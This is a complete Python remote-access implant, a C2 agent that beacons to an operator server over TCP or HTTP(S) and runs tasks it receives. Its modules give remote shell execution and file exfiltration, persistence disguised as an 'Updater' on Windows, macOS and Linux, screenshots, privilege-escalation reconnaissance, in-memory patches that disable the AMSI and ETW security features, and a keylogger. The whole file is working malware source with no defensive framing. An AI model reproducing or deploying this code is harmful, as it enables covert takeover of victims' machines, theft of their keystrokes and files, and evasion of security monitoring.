#!/usr/bin/env python3
"""Full C2 agent - TCP / HTTP / HTTPS, all post-exploitation modules."""
import os, sys, json, time, base64, random, socket, struct, platform, subprocess
import threading, io, tempfile, uuid, hashlib
import requests
from cryptography.hazmat.primitives import serialization
from common import (aes_encrypt, aes_decrypt, rsa_encrypt, rsa_decrypt,
                    recv_exact, recv_msg, send_msg, DEFAULT_PROFILE)

PUBKEY_PATH = "server_public.pem"
BEACON_INTERVAL = 5
JITTER = 0.3
RECONNECT_DELAY = 10

_keylogger = {"listener": None, "log_path": None, "thread": None}


# ---------- Identity ----------
def _machine_id():
    parts = [platform.node()]
    try:
        parts.append(str(uuid.getnode()))
    except Exception:
        pass
    parts.append(platform.machine())
    return hashlib.sha256("|".join(parts).encode()).hexdigest()[:16]


def gather_info():
    return {
        "hostname": platform.node(),
        "user": os.getenv("USER") or os.getenv("USERNAME") or "?",
        "os": platform.system(),
        "os_version": platform.version(),
        "arch": platform.machine(),
        "pid": os.getpid(),
        "machine_id": _machine_id(),
    }


# ---------- Transports ----------
class TCPTransport:
    def __init__(self, host, port):
        self.host, self.port = host, port
        self.sock = None

    def connect(self):
        self.sock = socket.socket()
        self.sock.settimeout(60)
        self.sock.connect((self.host, self.port))

    def register(self, enc_payload):
        send_msg(self.sock, enc_payload)
        return recv_msg(self.sock)

    def beacon(self, agent_id, enc_beacon):
        send_msg(self.sock, enc_beacon)
        return recv_msg(self.sock)

    def submit(self, agent_id, enc_result):
        send_msg(self.sock, enc_result)


class HTTPTransport:
    def __init__(self, base_url, profile, verify_tls=False):
        self.base_url = base_url.rstrip("/")
        self.profile = profile
        self.session = requests.Session()
        self.session.verify = verify_tls

    def _headers(self, agent_id=None):
        h = {"User-Agent": self.profile["user_agent"]}
        h.update(self.profile.get("headers", {}))
        if agent_id:
            h["X-Agent-Id"] = agent_id
        return h

    def connect(self):
        pass

    def register(self, enc_payload):
        r = self.session.post(
            self.base_url + self.profile["register_uri"],
            data=enc_payload, headers=self._headers(), timeout=60)
        r.raise_for_status()
        return r.content

    def beacon(self, agent_id, enc_beacon):
        r = self.session.post(
            self.base_url + self.profile["beacon_uri"],
            data=enc_beacon, headers=self._headers(agent_id), timeout=60)
        r.raise_for_status()
        return r.content

    def submit(self, agent_id, enc_result):
        self.session.post(
            self.base_url + self.profile["result_uri"],
            data=enc_result, headers=self._headers(agent_id), timeout=60)


# ---------- Modules ----------
def _shell(cmd):
    try:
        r = subprocess.run(cmd, shell=True, capture_output=True,
                           text=True, timeout=180)
        return (r.stdout or "") + (r.stderr or "") or "(no output)"
    except Exception as e:
        return f"[!] {e}"


def _ps():
    return _shell("tasklist" if os.name == "nt" else "ps aux")


def _env():
    return "\n".join(f"{k}={v}" for k, v in os.environ.items())


def _download(path):
    try:
        with open(path, "rb") as f:
            return base64.b64encode(f.read()).decode()
    except Exception as e:
        return f"[!] {e}"


def _upload(content_b64, remote):
    try:
        data = base64.b64decode(content_b64)
        with open(remote, "wb") as f:
            f.write(data)
        return f"[+] Wrote {len(data)} bytes -> {remote}"
    except Exception as e:
        return f"[!] {e}"


def _persist(kind):
    here = os.path.abspath(__file__)
    py = sys.executable or "python3"
    if os.name == "nt":
        kind = kind or "registry"
        if kind == "registry":
            cmd = (f'reg add HKCU\\Software\\Microsoft\\Windows\\'
                   f'CurrentVersion\\Run /v Updater /t REG_SZ /d '
                   f'"\\"{py}\\" \\"{here}\\"" /f')
            return _shell(cmd)
        if kind == "startup":
            startup = os.path.join(
                os.getenv("APPDATA", ""),
                r"Microsoft\Windows\Start Menu\Programs\Startup")
            dst = os.path.join(startup, "Updater.py")
            try:
                with open(here, "rb") as s, open(dst, "wb") as d:
                    d.write(s.read())
                return f"[+] Copied to {dst}"
            except Exception as e:
                return f"[!] {e}"
        if kind == "schtask":
            return _shell(
                f'schtasks /create /tn "Updater" /tr '
                f'"\\"{py}\\" \\"{here}\\"" /sc minute /mo 30 /f')
    if sys.platform == "darwin":
        plist = f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0"><dict>
<key>Label</key><string>com.apple.updater</string>
<key>ProgramArguments</key><array><string>{py}</string><string>{here}</string></array>
<key>RunAtLoad</key><true/>
<key>StartInterval</key><integer>600</integer>
</dict></plist>"""
        path = os.path.expanduser("~/Library/LaunchAgents/com.apple.updater.plist")
        try:
            with open(path, "w") as f:
                f.write(plist)
            return _shell(f"launchctl load {path}")
        except Exception as e:
            return f"[!] {e}"

    kind = kind or "cron"
    if kind == "cron":
        line = f"*/10 * * * * {py} {here} # Updater\n"
        try:
            cur = subprocess.run(["crontab", "-l"],
                                 capture_output=True, text=True).stdout
            p = subprocess.run(["crontab", "-"], input=cur + line,
                               capture_output=True, text=True)
            return "[+] cron installed" if p.returncode == 0 else f"[!] {p.stderr}"
        except Exception as e:
            return f"[!] {e}"
    if kind == "rc":
        try:
            with open(os.path.expanduser("~/.bashrc"), "a") as f:
                f.write(f"\n({py} {here} &) # Updater\n")
            return "[+] .bashrc updated"
        except Exception as e:
            return f"[!] {e}"
    if kind == "systemd":
        unit = (f"[Unit]\nDescription=System Updater\n[Service]\n"
                f"ExecStart={py} {here}\nRestart=always\nRestartSec=60\n"
                f"[Install]\nWantedBy=multi-user.target\n")
        path = os.path.expanduser("~/.config/systemd/user/updater.service")
        try:
            os.makedirs(os.path.dirname(path), exist_ok=True)
            with open(path, "w") as f:
                f.write(unit)
            return _shell("systemctl --user enable --now updater.service")
        except Exception as e:
            return f"[!] {e}"
    return f"[!] unknown persistence kind: {kind}"


def _screenshot():
    try:
        if sys.platform.startswith("linux"):
            import subprocess as sp
            for cmd in (["import", "-window", "root", "png:-"],
                        ["scrot", "-o", "-"]):
                try:
                    p = sp.run(cmd, capture_output=True, timeout=10)
                    if p.returncode == 0 and p.stdout:
                        return base64.b64encode(p.stdout).decode()
                except FileNotFoundError:
                    pass
        from PIL import ImageGrab
        img = ImageGrab.grab()
        buf = io.BytesIO()
        img.save(buf, format="PNG")
        return base64.b64encode(buf.getvalue()).decode()
    except Exception as e:
        return f"[!] screenshot failed: {e}"


def _privesc():
    out = []
    if os.name == "nt":
        out.append("=== whoami /priv ===\n" + _shell("whoami /priv"))
        out.append("=== whoami /groups ===\n" + _shell("whoami /groups"))
        out.append("=== systeminfo ===\n" +
                   _shell('systeminfo | findstr /B /C:"OS Name" '
                          '/C:"OS Version" /C:"Hotfix"'))
        out.append("=== unquoted service paths ===\n" +
                   _shell('wmic service get name,displayname,pathname,'
                          'startmode | findstr /i "auto"'))
        out.append("=== Temp ACL ===\n" + _shell("icacls C:\\Windows\\Temp"))
    else:
        out.append("=== id ===\n" + _shell("id"))
        out.append("=== sudo -l ===\n" +
                   _shell("sudo -n -l 2>&1 || sudo -l 2>&1"))
        out.append("=== SUID binaries ===\n" +
                   _shell("find / -perm -4000 -type f 2>/dev/null | head -50"))
        out.append("=== kernel version ===\n" + _shell("uname -a"))
        out.append("=== passwd/shadow ===\n" +
                   _shell("ls -l /etc/passwd /etc/shadow"))
        out.append("=== cron jobs ===\n" +
                   _shell("ls -la /etc/cron* /var/spool/cron 2>/dev/null"))
    return "\n\n".join(out)


def _amsi_bypass():
    if os.name != "nt":
        return "[-] Windows only"
    try:
        import ctypes
        from ctypes import wintypes
        lib = ctypes.windll.kernel32.LoadLibraryW("amsi.dll")
        if not lib:
            return "[-] amsi.dll not loaded"
        addr = ctypes.windll.kernel32.GetProcAddress(lib, b"AmsiScanBuffer")
        if not addr:
            return "[-] AmsiScanBuffer not found"
        patch = b"\xB8\x57\x00\x07\x80\xC3"  # mov eax,0x80070057; ret
        old = wintypes.DWORD()
        ctypes.windll.kernel32.VirtualProtect(
            addr, len(patch), 0x40, ctypes.byref(old))
        ctypes.memmove(addr, patch, len(patch))
        ctypes.windll.kernel32.VirtualProtect(
            addr, len(patch), old, ctypes.byref(old))
        return "[+] AMSI patched"
    except Exception as e:
        return f"[!] {e}"


def _etw_patch():
    if os.name != "nt":
        return "[-] Windows only"
    try:
        import ctypes
        from ctypes import wintypes
        is32 = platform.architecture()[0] == "32bit"
        ntdll = ctypes.windll.kernel32.LoadLibraryW("ntdll.dll")
        addr = ctypes.windll.kernel32.GetProcAddress(ntdll, b"EtwEventWrite")
        if not addr:
            return "[-] EtwEventWrite not found"
        patch = b"\x33\xC0\xC3" if is32 else b"\x48\x33\xC0\xC3"
        old = wintypes.DWORD()
        ctypes.windll.kernel32.VirtualProtect(
            addr, len(patch), 0x40, ctypes.byref(old))
        ctypes.memmove(addr, patch, len(patch))
        ctypes.windll.kernel32.VirtualProtect(
            addr, len(patch), old, ctypes.byref(old))
        return f"[+] ETW patched ({'32' if is32 else '64'}-bit)"
    except Exception as e:
        return f"[!] {e}"


def _keylog_start():
    if _keylogger["listener"]:
        return "[*] already running"
    try:
        from pynput import keyboard
    except ImportError:
        return "[!] pynput not installed"
    path = os.path.join(tempfile.gettempdir(),
                        f".kl_{uuid.uuid4().hex[:8]}.log")
    f = open(path, "a", buffering=1)

    def on_press(key):
        try:
            f.write(key.char or "")
        except AttributeError:
            f.write(f"<{key.name}>" if hasattr(key, "name") else "")

    listener = keyboard.Listener(on_press=on_press)
    listener.daemon = True
    listener.start()
    _keylogger["listener"] = listener
    _keylogger["log_path"] = path
    return f"[+] keylogger started -> {path}"


def _keylog_dump():
    p = _keylogger.get("log_path")
    if not p or not os.path.exists(p):
        return "[-] no log"
    try:
        with open(p, "r", errors="ignore") as f:
            return f.read()[-100_000:] or "(empty)"
    except Exception as e:
        return f"[!] {e}"


def _keylog_stop():
    l = _keylogger.get("listener")
    if l:
        try:
            l.stop()
        except Exception:
            pass
    _keylogger["listener"] = None
    return "[*] stopped"


def execute_task(task):
    cmd = task["command"]
    a = task.get("args", {}) or {}
    try:
        if cmd == "shell":         return _shell(a.get("command", ""))
        if cmd == "sysinfo":       return json.dumps(gather_info(), indent=2)
        if cmd == "ps":            return _ps()
        if cmd == "env":           return _env()
        if cmd == "download":      return _download(a["path"])
        if cmd == "upload":        return _upload(a["content"], a["remote"])
        if cmd == "persist":       return _persist(a.get("kind", ""))
        if cmd == "screenshot":    return _screenshot()
        if cmd == "privesc":       return _privesc()
        if cmd == "amsi":          return _amsi_bypass()
        if cmd == "etw":           return _etw_patch()
        if cmd == "keylog_start":  return _keylog_start()
        if cmd == "keylog_dump":   return _keylog_dump()
        if cmd == "keylog_stop":   return _keylog_stop()
        return f"[!] unknown command: {cmd}"
    except Exception as e:
        return f"[!] {cmd}: {e}"


# ---------- Agent ----------
class Agent:
    def __init__(self, transport, profile, pub):
        self.transport = transport
        self.profile = profile
        self.pub = pub
        self.session_key = None
        self.agent_id = None

    def register(self):
        self.transport.connect()
        self.session_key = os.urandom(32)
        reg = json.dumps({
            "session_key": base64.b64encode(self.session_key).decode(),
            "info": gather_info(),
        }).encode()
        raw = self.transport.register(rsa_encrypt(self.pub, reg))
        if not raw:
            raise RuntimeError("no registration response")
        ack = json.loads(aes_decrypt(self.session_key, raw))
        self.agent_id = ack["agent_id"]
        print(f"[*] Registered as {self.agent_id[:8]}")

    def run(self):
        self.register()
        while True:
            sleep = BEACON_INTERVAL * (1 + random.uniform(-JITTER, JITTER))
            time.sleep(sleep)
            enc_b = aes_encrypt(self.session_key,
                                json.dumps({"type": "beacon"}).encode())
            raw = self.transport.beacon(self.agent_id, enc_b)
            if not raw:
                raise RuntimeError("disconnected")
            task = json.loads(aes_decrypt(self.session_key, raw))
            if task.get("type") == "noop":
                continue
            if task.get("type") == "task":
                print(f"[*] task: {task['command']} ({task['task_id'][:8]})")
                output = execute_task(task)
                enc_r = aes_encrypt(self.session_key, json.dumps({
                    "type": "result",
                    "task_id": task["task_id"],
                    "output": output,
                }).encode())
                self.transport.submit(self.agent_id, enc_r)


def main():
    import argparse
    ap = argparse.ArgumentParser()
    ap.add_argument("--transport", choices=["tcp", "http", "https"], default="tcp")
    ap.add_argument("--host", default="127.0.0.1")
    ap.add_argument("--port", type=int, default=None)
    ap.add_argument("--url", default=None)
    ap.add_argument("--profile", default=None)
    ap.add_argument("--pubkey", default=PUBKEY_PATH)
    ap.add_argument("--insecure", action="store_true")
    args = ap.parse_args()

    with open(args.pubkey, "rb") as f:
        pub = serialization.load_pem_public_key(f.read())

    profile = DEFAULT_PROFILE
    if args.profile:
        with open(args.profile) as f:
            profile = json.load(f)

    delay = RECONNECT_DELAY
    while True:
        try:
            if args.transport == "tcp":
                transport = TCPTransport(args.host, args.port or 4444)
            elif args.transport == "http":
                url = args.url or f"http://{args.host}:{args.port or 8080}"
                transport = HTTPTransport(url, profile,
                                          verify_tls=not args.insecure)
            else:
                url = args.url or f"https://{args.host}:{args.port or 8443}"
                transport = HTTPTransport(url, profile, verify_tls=False)
            Agent(transport, profile, pub).run()
            delay = RECONNECT_DELAY
        except KeyboardInterrupt:
            print("[*] Exiting.")
            return
        except Exception as e:
            print(f"[!] {e}. Reconnecting in {delay}s...")
            time.sleep(delay)
            delay = min(delay * 2, 300)


if __name__ == "__main__":
    main()
